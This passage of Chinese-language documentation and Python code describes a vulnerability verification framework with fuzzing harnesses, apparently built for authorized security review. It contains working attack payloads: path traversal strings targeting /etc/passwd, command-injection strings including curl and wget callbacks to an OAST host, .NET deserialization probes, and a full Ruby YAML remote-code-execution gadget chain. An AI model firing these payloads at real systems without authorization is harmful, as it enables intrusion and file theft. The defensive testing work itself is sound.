                verdict=Verdict.UNCERTAIN,
                confidence=0.2,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


class PathTraversalVerifier(BaseVerifier):
    """路径遍历漏洞验证器 (通用)"""

    def __init__(self, target_url: str, endpoint: str, param: str = "file"):
        super().__init__()
        self.target_url = target_url
        self.endpoint = endpoint
        self.param = param

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: 路径遍历漏洞...")

        try:
            payloads = [
                # Unix
                ("../../../etc/passwd", ["root:", "daemon:", "bin:"]),
                ("....//....//....//etc/passwd", ["root:", "daemon:"]),
                ("..%2f..%2f..%2fetc/passwd", ["root:", "daemon:"]),
                ("..%252f..%252f..%252fetc/passwd", ["root:", "daemon:"]),
                ("/etc/passwd", ["root:", "daemon:"]),

                # Windows
                ("..\\..\\..\\windows\\win.ini", ["[fonts]", "[extensions]"]),
                ("....\\\\....\\\\windows\\win.ini", ["[fonts]"]),
                ("C:\\windows\\win.ini", ["[fonts]"]),
            ]

            for payload, indicators in payloads:
                # GET请求
                url = f"{self.target_url}{self.endpoint}?{self.param}={requests.utils.quote(payload)}"
                resp = self._make_request("GET", url)

                if resp:
                    for indicator in indicators:
                        if indicator in resp.text:
                            return VerificationResult(
                                vuln_id="PATH-001",
                                title="路径遍历/任意文件读取",
                                severity=Severity.HIGH,
                                verdict=Verdict.CONFIRMED,
                                confidence=0.95,
                                evidence=f"成功读取系统文件 (payload: {payload})",
                                poc=f"curl '{url}'",
                                recommendation="使用白名单验证文件路径，禁止../"
                            )

            return VerificationResult(
                vuln_id="PATH-001",
                title="路径遍历/任意文件读取",
                severity=Severity.HIGH,
                verdict=Verdict.FALSE_POSITIVE,
                confidence=0.7,
                evidence="路径遍历payload被过滤或无效",
                poc="",
                recommendation="可能已修复"
            )
        except Exception as e:
            return VerificationResult(
                vuln_id="PATH-001",
                title="路径遍历/任意文件读取",
                severity=Severity.HIGH,
                verdict=Verdict.UNCERTAIN,
                confidence=0.2,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


class CommandInjectionVerifier(BaseVerifier):
    """命令注入验证器 (通用)"""

    def __init__(self, target_url: str, endpoint: str, param: str = "cmd"):
        super().__init__()
        self.target_url = target_url
        self.endpoint = endpoint
        self.param = param

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: 命令注入...")

        try:
            # 使用时间延迟检测
            payloads = [
                ("; sleep 3", 3),
                ("| sleep 3", 3),
                ("& sleep 3", 3),
                ("&& sleep 3", 3),
                ("|| sleep 3", 3),
                ("`sleep 3`", 3),
                ("$(sleep 3)", 3),
                ("%0asleep 3", 3),  # 换行
                # Windows
                ("& ping -n 4 127.0.0.1", 3),
                ("| ping -n 4 127.0.0.1", 3),
            ]

            for payload, expected_delay in payloads:
                url = f"{self.target_url}{self.endpoint}"
                data = {self.param: f"test{payload}"}

                start_time = time.time()
                resp = self._make_request("POST", url, data=data, timeout=15)
                elapsed = time.time() - start_time

                if elapsed >= expected_delay - 0.5:
                    return VerificationResult(
                        vuln_id="CMDI-001",
                        title="命令注入",
                        severity=Severity.CRITICAL,
                        verdict=Verdict.CONFIRMED,
                        confidence=0.9,
                        evidence=f"时间延迟检测成功: payload '{payload}' 导致 {elapsed:.2f}s 延迟",
                        poc=f"curl -d '{self.param}=test{payload}' {url}",
                        recommendation="使用参数化执行，禁止shell调用"
                    )

            # DNS/HTTP回调检测 (如果有OAST服务)
            callback_payloads = [
                "; curl http://oast.fun/cmdi",
                "| wget http://oast.fun/cmdi",
                "`nslookup oast.fun`",
            ]

            return VerificationResult(
                vuln_id="CMDI-001",
                title="命令注入",
                severity=Severity.CRITICAL,
                verdict=Verdict.FALSE_POSITIVE,
                confidence=0.6,
                evidence="时间延迟检测未成功",
                poc="",
                recommendation="可能已过滤或不存在"
            )
        except Exception as e:
            return VerificationResult(
                vuln_id="CMDI-001",
                title="命令注入",
                severity=Severity.CRITICAL,
                verdict=Verdict.UNCERTAIN,
                confidence=0.2,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


class DotNetDeserializationVerifier(BaseVerifier):
    """.NET反序列化漏洞验证器"""

    def __init__(self, target_url: str, endpoint: str):
        super().__init__()
        self.target_url = target_url
        self.endpoint = endpoint

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: .NET反序列化...")

        try:
            # .NET反序列化payload需要ysoserial.net生成
            # 这里检测ViewState反序列化
            payloads = [
                # ViewState检测
                "__VIEWSTATE=AAEAAAD/////",
                # TypeNameHandling检测 (JSON.NET)
                '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start"}',
                # BinaryFormatter检测
                "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0=",
            ]

            for payload in payloads:
                if "__VIEWSTATE" in payload:
                    resp = self._make_request(
                        "POST",
                        f"{self.target_url}{self.endpoint}",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        data=payload
                    )
                else:
                    resp = self._make_request(
                        "POST",
                        f"{self.target_url}{self.endpoint}",
                        headers={"Content-Type": "application/json"},
                        data=payload
                    )

                if resp:
                    error_indicators = [
                        "BinaryFormatter",
                        "TypeNameHandling",
                        "ObjectDataProvider",
                        "SerializationException",
                        "InvalidCastException",
                        "Type is not resolved"
                    ]
                    for indicator in error_indicators:
                        if indicator in resp.text:
                            return VerificationResult(
                                vuln_id="DESER-NET-001",
                                title=".NET反序列化漏洞",
                                severity=Severity.CRITICAL,
                                verdict=Verdict.LIKELY,
                                confidence=0.7,
                                evidence=f"检测到.NET反序列化特征: {indicator}",
                                poc="使用ysoserial.net生成payload",
                                recommendation="禁用BinaryFormatter，TypeNameHandling设为None"
                            )

            return VerificationResult(
                vuln_id="DESER-NET-001",
                title=".NET反序列化漏洞",
                severity=Severity.CRITICAL,
                verdict=Verdict.FALSE_POSITIVE,
                confidence=0.6,
                evidence="未检测到.NET反序列化特征",
                poc="",
                recommendation="可能已修复"
            )
        except Exception as e:
            return VerificationResult(
                vuln_id="DESER-NET-001",
                title=".NET反序列化漏洞",
                severity=Severity.CRITICAL,
                verdict=Verdict.UNCERTAIN,
                confidence=0.2,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


class RubyDeserializationVerifier(BaseVerifier):
    """Ruby Marshal/YAML反序列化验证器"""

    def __init__(self, target_url: str, endpoint: str, param: str = "data"):
        super().__init__()
        self.target_url = target_url
        self.endpoint = endpoint
        self.param = param

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: Ruby反序列化...")

        try:
            # Ruby YAML反序列化payload
            yaml_payloads = [
                # Ruby 2.x Psych YAML RCE
                '''--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve''',
                # 简单的YAML对象注入
                '--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\n? test\n: !ruby/struct\n  foo: bar',
            ]

            for payload in yaml_payloads:
                resp = self._make_request(
                    "POST",
                    f"{self.target_url}{self.endpoint}",
                    headers={"Content-Type": "application/x-yaml"},
                    data=payload
                )

                if resp:
                    error_indicators = [
                        "Psych::DisallowedClass",
                        "YAML",
                        "Marshal",
                        "undefined class",
                        "Gem::",
                        "ArgumentError"
                    ]
                    for indicator in error_indicators:
                        if indicator in resp.text:
                            return VerificationResult(
                                vuln_id="DESER-RUBY-001",
                                title="Ruby YAML/Marshal反序列化",
                                severity=Severity.CRITICAL,
                                verdict=Verdict.LIKELY,
                                confidence=0.7,
                                evidence=f"检测到Ruby反序列化特征: {indicator}",
                                poc="YAML.load(user_input) 或 Marshal.load(user_input)",
                                recommendation="使用YAML.safe_load，禁用Marshal.load"
                            )

            return VerificationResult(
                vuln_id="DESER-RUBY-001",
                title="Ruby YAML/Marshal反序列化",
                severity=Severity.CRITICAL,
                verdict=Verdict.FALSE_POSITIVE,
                confidence=0.6,
                evidence="未检测到Ruby反序列化特征",
                poc="",
                recommendation="可能已修复"
            )
        except Exception as e:
            return VerificationResult(
                vuln_id="DESER-RUBY-001",
                title="Ruby YAML/Marshal反序列化",
                severity=Severity.CRITICAL,
                verdict=Verdict.UNCERTAIN,
                confidence=0.2,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


# =============================================
# 主验证框架
# =============================================

class VulnerabilityVerificationFramework:
    """漏洞验证框架"""

    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.verifiers: List[BaseVerifier] = []
        self.results: List[VerificationResult] = []

    def add_verifier(self, verifier: BaseVerifier):
        """添加验证器"""
        self.verifiers.append(verifier)

    def run(self) -> Dict[str, Any]:
        """执行所有验证"""
        print("=" * 60)
        print("security-review 漏洞自动化验证")
        print("=" * 60)
        print(f"目标: {self.config.get('target_url', 'N/A')}")
        print(f"时间: {datetime.now().isoformat()}")
        print(f"验证器数量: {len(self.verifiers)}")

        # 执行验证
        for verifier in self.verifiers:
            try:
                result = verifier.verify()
                self.results.append(result)

                # 打印结果
                status = "✅ 确认" if result.verdict == Verdict.CONFIRMED else \
                         "⚠️ 可能" if result.verdict == Verdict.LIKELY else \
                         "❓ 不确定" if result.verdict == Verdict.UNCERTAIN else \
                         "❌ 误报"
                print(f"    [{status}] {result.title} ({result.confidence:.0%})")
            except Exception as e:
                print(f"    [!] 验证器异常: {e}")
                traceback.print_exc()

        # 生成报告
        confirmed = [r for r in self.results if r.verdict == Verdict.CONFIRMED]
        likely = [r for r in self.results if r.verdict == Verdict.LIKELY]

        report = {
            "target": self.config.get("target_url"),
            "timestamp": datetime.now().isoformat(),
            "summary": {
                "total": len(self.results),
                "confirmed": len(confirmed),
                "likely": len(likely),
                "critical": len([r for r in confirmed if r.severity == Severity.CRITICAL]),
                "high": len([r for r in confirmed if r.severity == Severity.HIGH]),
            },
            "findings": [r.to_dict() for r in self.results]
        }

        # 输出汇总
        print("\n" + "=" * 60)
        print("验证结果汇总")
        print("=" * 60)
        print(f"总计: {report['summary']['total']} 项验证")
        print(f"确认: {report['summary']['confirmed']} 个漏洞")
        print(f"可能: {report['summary']['likely']} 个漏洞")
        print(f"严重: {report['summary']['critical']} 个")
        print(f"高危: {report['summary']['high']} 个")

        return report

    def save_report(self, path: str):
        """保存报告"""
        report = self.run()

        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(f"\n报告已保存: {path}")
        return report


# =============================================
# 使用示例
# =============================================

def main():
    """主函数"""

    # 初始化框架
    framework = VulnerabilityVerificationFramework({
        "target_url": TARGET_URL,
        "mysql_host": MYSQL_HOST,
        "redis_host": REDIS_HOST,
    })

    # 添加验证器 (根据静态分析结果配置)
    # 示例: DataEase漏洞

    # 1. 硬编码AES密钥
    framework.add_verifier(HardcodedSecretVerifier(
        key=b"www.fit2cloud.co",
        iv=b"1234567890123456"
    ))

    # 2. JWT绕过
    framework.add_verifier(JWTBypassVerifier(
        target_url=TARGET_URL,
        api_endpoint="/api/user/info"
    ))

    # 3. SSRF
    framework.add_verifier(SSRFVerifier(
        target_url=TARGET_URL,
        ssrf_endpoint="/api/datasource/loadRemoteFile",
        internal_target="http://internal-service/"
    ))

    # 4. Redis弱密码
    framework.add_verifier(RedisWeakPasswordVerifier(
        host=REDIS_HOST,
        port=6379
    ))

    # 执行验证并保存报告
    framework.save_report("/workspace/reports/verification_report.json")


if __name__ == "__main__":
    main()
```

---

## Fuzzing Harness 模式

### 核心理念

**即使整个项目无法运行，也能验证漏洞！**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         Fuzzing Harness 工作流程                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. 提取目标函数                                                             │
│     ┌─────────────────────────────────────────────────────────────────────┐ │
│     │ def vulnerable_function(user_input):                                │ │
│     │     os.system(f"echo {user_input}")                                 │ │
│     └─────────────────────────────────────────────────────────────────────┘ │
│                                │                                            │
│                                ▼                                            │
│  2. Mock 危险函数                                                            │
│     ┌─────────────────────────────────────────────────────────────────────┐ │
│     │ executed_commands = []                                              │ │
│     │ original_system = os.system                                         │ │
│     │ def mock_system(cmd):                                               │ │
│     │     executed_commands.append(cmd)                                   │ │
│     │     return 0                                                        │ │
│     │ os.system = mock_system                                             │ │
│     └─────────────────────────────────────────────────────────────────────┘ │
│                                │                                            │
│                                ▼                                            │
│  3. Fuzzing 测试                                                             │
│     ┌─────────────────────────────────────────────────────────────────────┐ │
│     │ payloads = ["; id", "| whoami", "$(cat /etc/passwd)"]               │ │
│     │ for payload in payloads:                                            │ │
│     │     vulnerable_function(payload)                                    │ │
│     │     if executed_commands:                                           │ │
│     │         print("[VULN] Command injection detected!")                 │ │
│     └─────────────────────────────────────────────────────────────────────┘ │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Python 命令注入 Harness

```python
#!/usr/bin/env python3
"""命令注入 Fuzzing Harness"""

import os
import subprocess

# === Mock 危险函数 ===
executed_commands = []
original_system = os.system
original_popen = subprocess.Popen

def mock_system(cmd):
    print(f"[DETECTED] os.system called: {cmd}")
    executed_commands.append(("os.system", cmd))
    return 0

def mock_popen(cmd, **kwargs):
    print(f"[DETECTED] subprocess.Popen called: {cmd}")
    executed_commands.append(("subprocess.Popen", cmd))
    class MockProcess:
        returncode = 0
        def communicate(self): return (b"mocked", b"")
        def wait(self): return 0
    return MockProcess()

os.system = mock_system
subprocess.Popen = mock_popen

# === 目标函数 (从项目代码复制) ===
def vulnerable_function(user_input):
    os.system(f"echo {user_input}")

# === Fuzzing 测试 ===
payloads = [
    "test",                    # 正常输入
    "; id",                    # 命令连接符
    "| whoami",                # 管道
    "$(cat /etc/passwd)",      # 命令替换
    "`id`",                    # 反引号
    "&& ls -la",               # AND 连接
    "|| ls",                   # OR 连接
    "\n id",                   # 换行
    "${IFS}id",                # IFS绕过
]

print("=== Command Injection Fuzzing ===\n")
for payload in payloads:
    print(f"Payload: {repr(payload)}")
    executed_commands.clear()
    try:
        vulnerable_function(payload)
        if executed_commands:
            print(f"[VULN] Detected! Commands: {executed_commands}")
    except Exception as e:
        print(f"[ERROR] {e}")
    print()
```

### SQL注入 Harness

```python
#!/usr/bin/env python3
"""SQL注入 Fuzzing Harness"""

# === Mock 数据库 ===
class MockCursor:
    def __init__(self):
        self.queries = []

    def execute(self, query, params=None):
        print(f"[SQL] Query: {query}")
        print(f"[SQL] Params: {params}")
        self.queries.append((query, params))

        # 检测 SQL 注入特征
        if params is None:
            dangerous_patterns = ["'", "OR", "--", "UNION", "SELECT", ";"]
            for pattern in dangerous_patterns:
                if pattern.lower() in query.lower():
                    print(f"[VULN] SQL Injection - '{pattern}' in query without parameterization!")

class MockDB:
    def cursor(self):
        return MockCursor()

# === 目标函数 ===
def get_user(db, user_id):
    cursor = db.cursor()
    cursor.execute(f"SELECT * FROM users WHERE id = '{user_id}'")  # 漏洞!

# === Fuzzing ===
db = MockDB()
payloads = [
    "1",                           # 正常
    "1'",                          # 单引号
    "1' OR '1'='1",                # 布尔注入
    "1'; DROP TABLE users--",      # 堆叠查询
    "1 UNION SELECT * FROM admin", # 联合查询
    "1' AND SLEEP(5)--",           # 时间盲注
]

print("=== SQL Injection Fuzzing ===\n")
for p in payloads:
    print(f"\n=== Testing: {p} ===")
    get_user(db, p)
```

---

## 输出报告格式

### verification_report.json

```json
{
  "target": "http://target:8080",
  "timestamp": "2026-02-05T10:30:00Z",
  "summary": {
    "total": 4,
    "confirmed": 3,
    "likely": 0,
    "critical": 2,
    "high": 1
  },
  "findings": [
    {
      "vuln_id": "CRYPTO-001",
      "title": "硬编码加密密钥",
      "severity": "Critical",
      "verdict": "confirmed",
      "confidence": 1.0,
      "evidence": "成功使用硬编码密钥加解密",
      "poc": "AES.new(b'www.fit2cloud.co', ...)",
      "recommendation": "使用环境变量存储密钥"
    }
  ]
}
```

---

## 最佳实践

### 1. 验证器设计原则

```
✅ 单一职责 - 每个验证器只验证一个漏洞
✅ 超时控制 - 所有网络请求必须有超时
✅ 异常处理 - 捕获并记录所有异常
✅ 证据收集 - 保存验证过程的详细证据
✅ 置信度评估 - 根据证据强度评估置信度
```

### 2. 安全注意事项

```
⚠️ 仅在授权环境中使用
⚠️ 不要在生产环境运行
⚠️ 网络隔离 - 使用独立的Docker网络
⚠️ 资源限制 - 限制容器CPU/内存
⚠️ 日志记录 - 记录所有验证操作
```

### 3. 与静态分析集成

```
1. 静态分析发现漏洞 → 生成 findings.json
2. 根据 findings.json 配置验证器
3. 运行 Docker 验证环境
4. 合并静态分析和动态验证结果
5. 生成最终审计报告
```

---

---

## 验证器覆盖矩阵

### 按语言分类

| 语言 | 验证器 | 漏洞类型 |
|------|--------|---------|
| **通用** | `SQLInjectionVerifier` | SQL注入 |
| **通用** | `CommandInjectionVerifier` | 命令注入 |
| **通用** | `SSRFVerifier` | SSRF |
| **通用** | `XXEVerifier` | XXE |
| **通用** | `PathTraversalVerifier` | 路径遍历 |
| **通用** | `HardcodedSecretVerifier` | 硬编码密钥 |
| **通用** | `JWTBypassVerifier` | JWT绕过 |
| **通用** | `RedisWeakPasswordVerifier` | 弱密码 |
| **Java** | `JavaDeserializationVerifier` | 反序列化 |
| **PHP** | `PHPDeserializationVerifier` | 反序列化 |
| **Python** | `PythonPickleVerifier` | Pickle反序列化 |
| **.NET** | `DotNetDeserializationVerifier` | 反序列化 |
| **Ruby** | `RubyDeserializationVerifier` | YAML/Marshal反序列化 |

### 按漏洞类型分类

| 漏洞类型 | 验证器 | 适用语言 |
|---------|--------|---------|
| **反序列化** | `JavaDeserializationVerifier` | Java |
| **反序列化** | `PHPDeserializationVerifier` | PHP |
| **反序列化** | `PythonPickleVerifier` | Python |
| **反序列化** | `DotNetDeserializationVerifier` | .NET/C# |
| **反序列化** | `RubyDeserializationVerifier` | Ruby |
| **注入类** | `SQLInjectionVerifier` | 全语言 |
| **注入类** | `CommandInjectionVerifier` | 全语言 |
| **注入类** | `XXEVerifier` | Java/PHP/.NET |
| **认证类** | `JWTBypassVerifier` | 全语言 |
| **配置类** | `HardcodedSecretVerifier` | 全语言 |
| **配置类** | `RedisWeakPasswordVerifier` | 全语言 |
| **服务端请求** | `SSRFVerifier` | 全语言 |
| **文件操作** | `PathTraversalVerifier` | 全语言 |

---

## 快速选择指南

### 根据项目语言选择Docker Profile

```bash
# Java/Spring Boot项目
docker-compose --profile java up -d

# Python/Flask/Django项目
docker-compose --profile python up -d

# PHP/Laravel项目
docker-compose --profile php up -d

# Node.js/Express项目
docker-compose --profile node up -d

# Go/Gin项目
docker-compose --profile go up -d

# Ruby/Rails项目
docker-compose --profile ruby up -d

# .NET/ASP.NET Core项目
docker-compose --profile dotnet up -d

# Rust/Actix项目
docker-compose --profile rust up -d

# C/C++项目
docker-compose --profile cpp up -d
```

### 根据漏洞类型选择验证器

```python
# === 注入类漏洞 ===
framework.add_verifier(SQLInjectionVerifier(url, "/api/users", "id"))
framework.add_verifier(CommandInjectionVerifier(url, "/api/ping", "host"))
framework.add_verifier(XXEVerifier(url, "/api/xml/parse"))

# === 反序列化漏洞 (根据语言选择) ===
# Java
framework.add_verifier(JavaDeserializationVerifier(url, "/api/deserialize", "CommonsCollections6"))
# PHP
framework.add_verifier(PHPDeserializationVerifier(url, "/api/unserialize", "data"))
# Python
framework.add_verifier(PythonPickleVerifier(url, "/api/load", "data"))
# .NET
framework.add_verifier(DotNetDeserializationVerifier(url, "/api/viewstate"))
# Ruby
framework.add_verifier(RubyDeserializationVerifier(url, "/api/yaml", "config"))

# === 认证/授权漏洞 ===
framework.add_verifier(JWTBypassVerifier(url, "/api/user/info"))

# === 服务端请求漏洞 ===
framework.add_verifier(SSRFVerifier(url, "/api/fetch", "http://internal/"))

# === 文件操作漏洞 ===
framework.add_verifier(PathTraversalVerifier(url, "/api/download", "file"))

# === 配置安全漏洞 ===
framework.add_verifier(HardcodedSecretVerifier(key=b"...", iv=b"..."))
framework.add_verifier(RedisWeakPasswordVerifier(host="redis", port=6379))
```

---

## 版本历史

- **v1.1.0** (2026-02-05): 完整语言覆盖
  - 新增9种语言Dockerfile模板 (Java, Python, PHP, Node.js, Go, Ruby, .NET, Rust, C/C++)
  - 新增Sandbox运行时: .NET SDK 8.0, Rust stable, GCC/G++
  - 新增语言特定验证器: Java/PHP/Python/.NET/Ruby反序列化
  - 新增通用验证器: 命令注入、XXE、路径遍历
  - 新增验证器覆盖矩阵和快速选择指南

- **v1.0.0** (2026-02-05): 初始版本，借鉴 DeepAudit 沙箱验证功能
